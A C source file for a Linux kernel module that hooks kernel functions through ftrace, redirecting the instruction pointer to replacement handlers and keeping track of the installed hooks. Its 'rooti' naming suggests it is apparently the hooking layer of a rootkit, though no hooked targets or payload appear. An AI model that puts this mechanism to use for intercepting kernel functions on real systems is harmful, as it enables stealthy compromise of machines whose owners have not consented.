#include <linux/list.h>
#include "hooking.h"
#include "utils.h"

LIST_HEAD(rooti_active_hooks);

static inline void rooti_store_original_func(struct rooti_func_hook *hook)
{
    // Skip over the ftrace call when called from this module (recursion protection mechanism)
    *((unsigned long *)hook->orig) = hook->addr + MCOUNT_INSN_SIZE;
}

static void notrace rooti_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                       struct ftrace_ops *ops, struct ftrace_regs *regs)
{
    struct rooti_func_hook *hook = container_of(ops, struct rooti_func_hook, ops);
    regs->regs.ip = (unsigned long)hook->func;
}

int rooti_install_func_hook(struct rooti_func_hook *hook)
{
    int err;

    rooti_store_original_func(hook);

    hook->ops.func = rooti_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->addr, 0, 0);
    if (err) {
        ROOTI_DEBUG("ftrace_set_filter_ip() failed: %d", err);
        goto error_set_filter;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        ROOTI_DEBUG("register_ftrace_function() failed: %d", err);
        goto error_register;
    }

    INIT_LIST_HEAD(&hook->list);
    list_add_tail(&hook->list, &rooti_active_hooks);

    return 0;

error_register:
    ftrace_set_filter_ip(&hook->ops, hook->addr, 1, 0);
error_set_filter:
    return err;
}

void rooti_uninstall_func_hook(struct rooti_func_hook *hook)
{
    int err;

    err = unregister_ftrace_function(&hook->ops);
    if (err) {
        ROOTI_DEBUG("unregister_ftrace_function() failed: %d", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->addr, 1, 0);
    if (err) {
        ROOTI_DEBUG("ftrace_set_filter_ip() failed: %d", err);
    }

    list_del(&hook->list);
}

int rooti_install_func_hooks(struct rooti_func_hook *hooks, size_t count)
{
    int err;
    int i;

    for (i = 0; i < count; i++) {
        err = rooti_install_func_hook(&hooks[i]);
        if (err) {
            goto error;
        }
    }
    return 0;

error:
    while (i > 0) {
        rooti_uninstall_func_hook(&hooks[--i]);
    }
    return err;
}

void rooti_uninstall_func_hooks(struct rooti_func_hook *hooks, size_t count)
{
    for (int i = 0; i < count; i++) {
        rooti_uninstall_func_hook(&hooks[i]);
    }
}
